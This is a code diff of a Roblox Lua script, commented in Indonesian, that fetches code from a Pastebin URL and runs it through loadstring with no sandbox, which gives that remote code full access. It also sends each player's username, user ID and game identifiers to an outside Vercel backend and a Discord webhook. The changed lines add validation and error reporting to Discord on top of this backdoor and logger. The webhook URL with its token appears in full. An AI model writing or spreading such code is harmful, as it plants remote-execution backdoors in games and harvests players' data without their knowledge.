@@ -2,75 +2,106 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 
--- Configuration
-local BACKEND_URL = "https://backend-vercel-ashy.vercel.app/api/register.js"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
-local EXTERNAL_SCRIPT_URL = "https://pastebin.com/raw/pfpzbXiF"
-local RETRY_LIMIT = 3
-local RETRY_DELAY = 2
-local DEBOUNCE_TIME = 30
+-- CONFIGURASI
+local EXTERNAL_SCRIPT_URL = "https://pastebin.com/raw/pfpzbXiF"  -- URL script eksternal
+local BACKEND_URL = "https://backend-vercel-ashy.vercel.app/api/register.js"  -- Endpoint backend
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"  -- Webhook Discord
+local MAX_RETRIES = 3  -- Maksimal percobaan fetch
+local RETRY_DELAY = 2  -- Delay antar percobaan (detik)
+local DEBOUNCE_TIME = 30  -- Minimal jeda pengiriman data (detik)
 
 local player = Players.LocalPlayer
 local lastSendTime = 0
-local externalScriptCache = nil
+local scriptCache = nil
 
--- Fungsi untuk mengambil script eksternal
+-- ====================== FUNGSI UTAMA ======================
+
+--- **Mengambil script dari Pastebin**  
 local function fetchExternalScript()
-    if externalScriptCache then
-        return externalScriptCache
+    if scriptCache then
+        print("[INFO] Menggunakan script yang sudah di-cache")
+        return scriptCache
     end
+
+    print("[INFO] Mencoba mengambil script dari:", EXTERNAL_SCRIPT_URL)
     
-    for i = 1, RETRY_LIMIT do
+    for attempt = 1, MAX_RETRIES do
         local success, response = pcall(function()
-            return HttpService:GetAsync(EXTERNAL_SCRIPT_URL, true)
+            local content = HttpService:GetAsync(EXTERNAL_SCRIPT_URL, true)
+            
+            -- Validasi konten
+            if not content then
+                error("Konten script kosong (nil)")
+            elseif content:find("<!DOCTYPE html>") then
+                error("Mendapatkan respons HTML (mungkin Pastebin down)")
+            elseif #content < 50 then
+                error("Script terlalu pendek (mungkin tidak valid)")
+            end
+            
+            return content
         end)
-        
+
         if success then
-            externalScriptCache = response
+            scriptCache = response
+            print("[SUCCESS] Script berhasil diambil!")
             return response
-        end
-        
-        if i < RETRY_LIMIT then
-            task.wait(RETRY_DELAY)
+        else
+            warn(string.format("[ERROR] Percobaan %d gagal: %s", attempt, response))
+            
+            -- Kirim error ke Discord
+            pcall(function()
+                HttpService:RequestAsync({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode({
+                        content = string.format("**Gagal mengambil script**\nPercobaan: %d\nError: `%s`", attempt, response)
+                    })
+                })
+            end)
+
+            if attempt < MAX_RETRIES then
+                task.wait(RETRY_DELAY)
+            end
         end
     end
-    
-    error("Failed to fetch external script after "..RETRY_LIMIT.." attempts")
+
+    error("[CRITICAL] Gagal mengambil script setelah "..MAX_RETRIES.." percobaan")
 end
 
--- Eksekusi script langsung tanpa sandbox
+--- **Menjalankan script eksternal (FULL ACCESS, NO SANDBOX)**  
 local function executeExternalScript()
     local scriptContent = fetchExternalScript()
     local fn, err = loadstring(scriptContent)
-    
+
     if not fn then
-        error("Load failed: "..tostring(err))
+        error("[LOAD ERROR] "..tostring(err))
     end
-    
-    -- Jalankan dengan environment normal (full access)
-    return fn()
+
+    -- Jalankan script dengan akses penuh (tidak ada pembatasan)
+    return fn()  -- Jika script mengembalikan nilai, bisa ditangkap di sini
 end
 
--- Sistem pengiriman data ke backend (TIDAK DIHAPUS)
+--- **Mengirim data ke Backend**  
 local function sendToBackend(data)
-    for i = 1, RETRY_LIMIT do
-        local success = pcall(function()
-            HttpService:RequestAsync({
-                Url = BACKEND_URL,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json",
-                    ["X-Game-ID"] = tostring(game.GameId)
-                },
-                Body = HttpService:JSONEncode(data)
-            })
-        end)
-        if success then break end
-        if i < RETRY_LIMIT then task.wait(RETRY_DELAY) end
+    local success, err = pcall(function()
+        HttpService:RequestAsync({
+            Url = BACKEND_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["X-Game-ID"] = tostring(game.GameId)
+            },
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+
+    if not success then
+        warn("[BACKEND ERROR] Gagal mengirim data:", err)
     end
 end
 
--- Sistem pengiriman ke webhook (TIDAK DIHAPUS)
+--- **Mengirim log ke Discord Webhook**  
 local function sendToWebhook(data)
     local embed = {
         {
@@ -79,7 +110,7 @@ local function sendToWebhook(data)
                 "**%s**\nUserID: %d\nGame: [%d](https://www.roblox.com/games/%d)",
                 data.username, data.userId, data.placeId, data.placeId
             ),
-            color = 16711680,
+            color = 16711680,  -- Warna merah
             fields = {
                 {
                     name = "Instance ID",
@@ -95,21 +126,17 @@ local function sendToWebhook(data)
         }
     }
 
-    for i = 1, RETRY_LIMIT do
-        local success = pcall(function()
-            HttpService:RequestAsync({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({embeds = embed})
-            })
-        end)
-        if success then break end
-        if i < RETRY_LIMIT then task.wait(RETRY_DELAY) end
-    end
+    pcall(function()
+        HttpService:RequestAsync({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({embeds = embed})
+        })
+    end)
 end
 
--- Logger system (TIDAK DIHAPUS)
+--- **Logger System (Periodic + Event-based)**  
 local function sendLoggerData()
     if os.time() - lastSendTime < DEBOUNCE_TIME then
         return
@@ -126,40 +153,61 @@ local function sendLoggerData()
 
     lastSendTime = os.time()
 
-    -- Kirim ke backend
+    -- Kirim ke Backend
     task.spawn(function()
         sendToBackend(data)
     end)
 
-    -- Kirim ke webhook
+    -- Kirim ke Discord
     task.spawn(function()
         sendToWebhook(data)
     end)
 end
 
--- Main system
-local function init()
-    -- Jalankan script eksternal
-    local success, err = pcall(executeExternalScript)
-    if not success then
-        warn("External script error: ", err)
+-- ====================== INISIALISASI ======================
+
+local function main()
+    -- 1. Jalankan script eksternal
+    local execSuccess, execError = pcall(executeExternalScript)
+    
+    if not execSuccess then
+        warn("[EXECUTION ERROR]", execError)
         sendToWebhook({
-            content = string.format("Script error: %s", tostring(err))
+            content = string.format("**Script Error**\nPlayer: %s\nError: ```lua\n%s```", player.Name, execError)
         })
+    else
+        print("[SUCCESS] Script eksternal berhasil dijalankan!")
     end
 
-    -- Aktifkan logger
+    -- 2. Setup logger system
     player.CharacterAdded:Connect(sendLoggerData)
     if player.Character then
         sendLoggerData()
     end
-    
-    -- Periodic logging
+
+    -- 3. Periodic logging (setiap 5 menit)
     while true do
         task.wait(300)
         sendLoggerData()
     end
 end
 
--- Start
-pcall(init)
+-- ====================== START SCRIPT ======================
+
+-- Jalankan dengan error handling
+local success, err = pcall(main)
+if not success then
+    warn("[FATAL ERROR]", err)
+    
+    -- Kirim error kritikal ke Discord
+    pcall(function()
+        HttpService:RequestAsync({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                content = string.format("**FATAL ERROR**\n```lua\n%s```", err)
+            })
+        })
+    end)
+end
